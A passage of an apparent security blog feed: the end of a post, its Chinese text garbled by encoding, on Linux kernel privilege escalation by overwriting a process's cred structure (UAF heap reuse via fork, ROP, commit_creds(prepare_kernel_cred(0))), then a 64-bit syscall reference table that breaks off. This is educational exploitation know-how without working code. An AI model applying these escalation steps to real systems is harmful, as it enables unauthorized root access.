class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* Process credentials: */</span><br><br>    <span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">ptracer_cred</span>;</span><br><br>    <span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">real_cred</span>;</span><br><br>    <span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">cred</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-comment">/* Cached requested key. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>          *<span class="hljs-title">cached_requested_key</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * executable name, excluding path.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * - normally initialized setup_new_exec()</span><br><span class="hljs-comment">     * - access it with [gs]et_task_comm()</span><br><span class="hljs-comment">     * - lock it with task_lock()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">char</span>                comm[TASK_COMM_LEN];<br></code></pre></td></tr></table></figure><p>ç„¶è€Œï¼Œåœ¨è¿›ç¨‹åå­—å¹¶ä¸ç‰¹æ®Šçš„æƒ…å†µä¸‹ï¼Œå†…æ ¸ä¸­å¯èƒ½ä¼šæœ‰å¤šä¸ªåŒæ ·çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¼šå½±å“æœç´¢çš„æ­£ç¡®æ€§ä¸æ•ˆç‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ prctl è®¾ç½®è¿›ç¨‹çš„ comm ä¸ºä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œç„¶åå†å¼€å§‹å®šä½ commã€‚</p><h2 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h2><p>åœ¨è¿™ç§æ–¹æ³•ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°† cred ä¸­çš„ <code>uid-fsgid</code> éƒ½ä¿®æ”¹ä¸º 0ã€‚å½“ç„¶ä¿®æ”¹çš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚è¯´</p><ul><li>åœ¨æˆ‘ä»¬å…·æœ‰ä»»æ„åœ°å€è¯»å†™åï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ credã€‚</li><li>åœ¨æˆ‘ä»¬å¯ä»¥ ROP æ‰§è¡Œä»£ç åï¼Œå¯ä»¥åˆ©ç”¨ ROP gadget ä¿®æ”¹ credã€‚</li></ul><h3 id="åˆ©ç”¨UAFä¿®æ”¹"><a href="#åˆ©ç”¨UAFä¿®æ”¹" class="headerlink" title="åˆ©ç”¨UAFä¿®æ”¹"></a>åˆ©ç”¨UAFä¿®æ”¹</h3><p>å¦‚æœæˆ‘ä»¬åœ¨è¿›ç¨‹åˆå§‹åŒ–æ—¶èƒ½æ§åˆ¶ cred ç»“æ„ä½“çš„ä½ç½®ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥åœ¨åˆå§‹åŒ–åä¿®æ”¹è¯¥éƒ¨åˆ†çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°è¾¾åˆ°ææƒçš„ç›®çš„ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªå…¸å‹çš„ä¾‹å­</p><ol><li>ç”³è¯·ä¸€å—ä¸ cred ç»“æ„ä½“å¤§å°ä¸€æ ·çš„å †å—</li><li>é‡Šæ”¾è¯¥å †å—</li><li>fork å‡ºæ–°è¿›ç¨‹ï¼Œæ°å¥½ä½¿ç”¨åˆšåˆšé‡Šæ”¾çš„å †å—</li><li>æ­¤æ—¶ï¼Œä¿®æ”¹ cred ç»“æ„ä½“ç‰¹å®šå†…å­˜ï¼Œä»è€Œææƒ</li></ol><p>éå¸¸æœ‰æ„æ€çš„æ˜¯ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦ä»»ä½•çš„ä¿¡æ¯æ³„éœ²ã€‚</p><h3 id="åˆ©ç”¨commit-credsä¿®æ”¹"><a href="#åˆ©ç”¨commit-credsä¿®æ”¹" class="headerlink" title="åˆ©ç”¨commit_credsä¿®æ”¹"></a>åˆ©ç”¨commit_credsä¿®æ”¹</h3><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ <code>commit_creds(prepare_kernel_cred(0))</code> æ¥è¿›è¡Œææƒï¼Œè¯¥æ–¹å¼ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåˆæ³•çš„ credï¼Œå¹¶å®šä½å½“å‰çº¿ç¨‹çš„ <code>task_struct</code> çš„ä½ç½®ï¼Œç„¶åä¿®æ”¹å®ƒçš„ cred ä¸ºæ–°çš„ credã€‚è¯¥æ–¹å¼æ¯”è¾ƒé€‚ç”¨äºæ§åˆ¶ç¨‹åºæ‰§è¡Œæµåä½¿ç”¨ã€‚</p><p><img src="/img/article/%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8/elevation-of-privilege.png" alt="72b919b7-87bb-4312-97ea-b59fe4690b2e"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Syscall Reference(64 bit)</title>
    <link href="/2023/03/29/Linux%20Syscall%20Reference(64%20bit)/"/>
    <url>/2023/03/29/Linux%20Syscall%20Reference(64%20bit)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åˆ—ä¸¾äº†å…¨éƒ¨çš„64ä½syscallè°ƒç”¨è¡¨ï¼Œæ–¹ä¾¿ç¦»çº¿æ—¶è¿›è¡ŒæŸ¥è¯¢</p></blockquote><table><thead><tr><th>#</th><th>Name</th><th>Registers</th><th>Definition</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>rax</td><td>rdi</td><td>rsi</td><td>rdx</td><td>r10</td><td>r8</td><td>r9</td><td></td><td></td><td></td></tr><tr><td>0</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td><td>0x00</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L621">fs&#x2F;read_write.c:621</a></td></tr><tr><td>1</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td><td>0x01</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L646">fs&#x2F;read_write.c:646</a></td></tr><tr><td>2</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html">sys_open</a></td><td>0x02</td><td>const char __user *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L256">fs&#x2F;fhandle.c:256</a></td></tr><tr><td>3</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html">sys_close</a></td><td>0x03</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1437">fs&#x2F;open.c:1437</a></td></tr><tr><td>4</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html">sys_newstat</a></td><td>0x04</td><td>const char __user *filename</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L406">fs&#x2F;stat.c:406</a></td></tr><tr><td>5</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html">sys_newfstat</a></td><td>0x05</td><td>unsigned int fd</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L444">fs&#x2F;stat.c:444</a></td></tr><tr><td>6</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html">sys_newlstat</a></td><td>0x06</td><td>const char __user *filename</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L417">fs&#x2F;stat.c:417</a></td></tr><tr><td>7</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html">sys_poll</a></td><td>0x07</td><td>struct pollfd __user *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L1068">fs&#x2F;select.c:1068</a></td></tr><tr><td>8</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html">sys_lseek</a></td><td>0x08</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L311">fs&#x2F;read_write.c:311</a></td></tr><tr><td>9</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html">sys_mmap</a></td><td>0x09</td><td>unsigned long addr</td><td>unsigned long len</td><td>int prot</td><td>int flags</td><td>int fd</td><td>long off</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/arch/arm64/kernel/sys.c#L21">arch&#x2F;arm64&#x2F;kernel&#x2F;sys.c:21</a></td></tr><tr><td>10</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html">sys_mprotect</a></td><td>0x0a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L816">mm&#x2F;mprotect.c:816</a></td></tr><tr><td>11</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html">sys_munmap</a></td><td>0x0b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L2797">mm&#x2F;mmap.c:2797</a></td></tr><tr><td>12</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html">sys_brk</a></td><td>0x0c</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L170">mm&#x2F;mmap.c:170</a></td></tr><tr><td>13</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html">sys_rt_sigaction</a></td><td>0x0d</td><td>int</td><td>const struct sigaction __user *</td><td>struct sigaction __user *</td><td>size_t</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4410">kernel&#x2F;signal.c:4410</a></td></tr><tr><td>14</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html">sys_rt_sigprocmask</a></td><td>0x0e</td><td>int how</td><td>sigset_t __user *set</td><td>sigset_t __user *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3141">kernel&#x2F;signal.c:3141</a></td></tr><tr><td>15</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html">sys_rt_sigreturn</a></td><td>0x0f</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>16</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html">sys_ioctl</a></td><td>0x10</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/ioctl.c#L856">fs&#x2F;ioctl.c:856</a></td></tr><tr><td>17</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html">sys_pread64</a></td><td>0x11</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L672">fs&#x2F;read_write.c:672</a></td></tr><tr><td>18</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html">sys_pwrite64</a></td><td>0x12</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L706">fs&#x2F;read_write.c:706</a></td></tr><tr><td>19</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html">sys_readv</a></td><td>0x13</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1041">fs&#x2F;read_write.c:1041</a></td></tr><tr><td>20</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html">sys_writev</a></td><td>0x14</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1047">fs&#x2F;read_write.c:1047</a></td></tr><tr><td>21</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html">sys_access</a></td><td>0x15</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L503">fs&#x2F;open.c:503</a></td></tr><tr><td>22</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html">sys_pipe</a></td><td>0x16</td><td>int __user *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/pipe.c#L1031">fs&#x2F;pipe.c:1031</a></td></tr><tr><td>23</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html">sys_select</a></td><td>0x17</td><td>int n</td><td>fd_set __user *inp</td><td>fd_set __user *outp</td><td>fd_set __user *exp</td><td>struct __kernel_old_timeval __user *tvp</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L726">fs&#x2F;select.c:726</a></td></tr><tr><td>24</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html">sys_sched_yield</a></td><td>0x18</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>25</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html">sys_mremap</a></td><td>0x19</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mremap.c#L889">mm&#x2F;mremap.c:889</a></td></tr><tr><td>26</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html">sys_msync</a></td><td>0x1a</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/msync.c#L32">mm&#x2F;msync.c:32</a></td></tr><tr><td>27</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html">sys_mincore</a></td><td>0x1b</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char __user * vec</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mincore.c#L232">mm&#x2F;mincore.c:232</a></td></tr><tr><td>28</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html">sys_madvise</a></td><td>0x1c</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/madvise.c#L1440">mm&#x2F;madvise.c:1440</a></td></tr><tr><td>29</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmget.2.html">sys_shmget</a></td><td>0x1d</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L850">ipc&#x2F;shm.c:850</a></td></tr><tr><td>30</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmat.2.html">sys_shmat</a></td><td>0x1e</td><td>int shmid</td><td>char __user *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1696">ipc&#x2F;shm.c:1696</a></td></tr><tr><td>31</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmctl.2.html">sys_shmctl</a></td><td>0x1f</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds __user *buf</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1299">ipc&#x2F;shm.c:1299</a></td></tr><tr><td>32</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html">sys_dup</a></td><td>0x20</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1269">fs&#x2F;file.c:1269</a></td></tr><tr><td>33</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html">sys_dup2</a></td><td>0x21</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1254">fs&#x2F;file.c:1254</a></td></tr><tr><td>34</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html">sys_pause</a></td><td>0x22</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>35</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html">sys_nanosleep</a></td><td>0x23</td><td>struct __kernel_timespec __user *rqtp</td><td>struct __kernel_timespec __user *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/hrtimer.c#L2118">kernel&#x2F;time&#x2F;hrtimer.c:2118</a></td></tr><tr><td>36</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html">sys_getitimer</a></td><td>0x24</td><td>int which</td><td>struct __kernel_old_itimerval __user *value</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L113">kernel&#x2F;time&#x2F;itimer.c:113</a></td></tr><tr><td>37</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html">sys_alarm</a></td><td>0x25</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L306">kernel&#x2F;time&#x2F;itimer.c:306</a></td></tr><tr><td>38</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html">sys_setitimer</a></td><td>0x26</td><td>int which</td><td>struct __kernel_old_itimerval __user *value</td><td>struct __kernel_old_itimerval __user *ovalue</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L332">kernel&#x2F;time&#x2F;itimer.c:332</a></td></tr><tr><td>39</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html">sys_getpid</a></td><td>0x27</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>40</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html">sys_sendfile64</a></td><td>0x28</td><td>int out_fd</td><td>int in_fd</td><td>loff_t __user *offset</td><td>size_t count</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1309">fs&#x2F;read_write.c:1309</a></td></tr><tr><td>41</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socket.2.html">sys_socket</a></td><td>0x29</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1647">net&#x2F;socket.c:1647</a></td></tr><tr><td>42</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/connect.2.html">sys_connect</a></td><td>0x2a</td><td>int</td><td>struct sockaddr __user *</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2000">net&#x2F;socket.c:2000</a></td></tr><tr><td>43</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/accept.2.html">sys_accept</a></td><td>0x2b</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1941">net&#x2F;socket.c:1941</a></td></tr><tr><td>44</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendto.2.html">sys_sendto</a></td><td>0x2c</td><td>int</td><td>void __user *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr __user *</td><td>int</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2125">net&#x2F;socket.c:2125</a></td></tr><tr><td>45</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvfrom.2.html">sys_recvfrom</a></td><td>0x2d</td><td>int</td><td>void __user *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr __user *</td><td>int __user *</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2183">net&#x2F;socket.c:2183</a></td></tr><tr><td>46</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmsg.2.html">sys_sendmsg</a></td><td>0x2e</td><td>int fd</td><td>struct user_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2572">net&#x2F;socket.c:2572</a></td></tr><tr><td>47</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmsg.2.html">sys_recvmsg</a></td><td>0x2f</td><td>int fd</td><td>struct user_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2780">net&#x2F;socket.c:2780</a></td></tr><tr><td>48</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shutdown.2.html">sys_shutdown</a></td><td>0x30</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2342">net&#x2F;socket.c:2342</a></td></tr><tr><td>49</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bind.2.html">sys_bind</a></td><td>0x31</td><td>int</td><td>struct sockaddr __user *</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1785">net&#x2F;socket.c:1785</a></td></tr><tr><td>50</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listen.2.html">sys_listen</a></td><td>0x32</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1817">net&#x2F;socket.c:1817</a></td></tr><tr><td>51</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockname.2.html">sys_getsockname</a></td><td>0x33</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2038">net&#x2F;socket.c:2038</a></td></tr><tr><td>52</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpeername.2.html">sys_getpeername</a></td><td>0x34</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2074">net&#x2F;socket.c:2074</a></td></tr><tr><td>53</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketpair.2.html">sys_socketpair</a></td><td>0x35</td><td>int</td><td>int</td><td>int</td><td>int __user *</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1748">net&#x2F;socket.c:1748</a></td></tr><tr><td>54</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsockopt.2.html">sys_setsockopt</a></td><td>0x36</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2260">net&#x2F;socket.c:2260</a></td></tr><tr><td>55</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockopt.2.html">sys_getsockopt</a></td><td>0x37</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int __user *optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2308">net&#x2F;socket.c:2308</a></td></tr><tr><td>56</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html">sys_clone</a></td><td>0x38</td><td>unsigned long</td><td>unsigned long</td><td>int __user *</td><td>unsigned long</td><td>int __user *</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L2785">kernel&#x2F;fork.c:2785</a></td></tr><tr><td>57</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html">sys_fork</a></td><td>0x39</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>58</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html">sys_vfork</a></td><td>0x3a</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>59</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td><td>0x3b</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/exec.c#L2087">fs&#x2F;exec.c:2087</a></td></tr><tr><td>60</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html">sys_exit</a></td><td>0x3c</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L915">kernel&#x2F;exit.c:915</a></td></tr><tr><td>61</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html">sys_wait4</a></td><td>0x3d</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td>struct rusage __user *ru</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L1730">kernel&#x2F;exit.c:1730</a></td></tr><tr><td>62</td><td><a 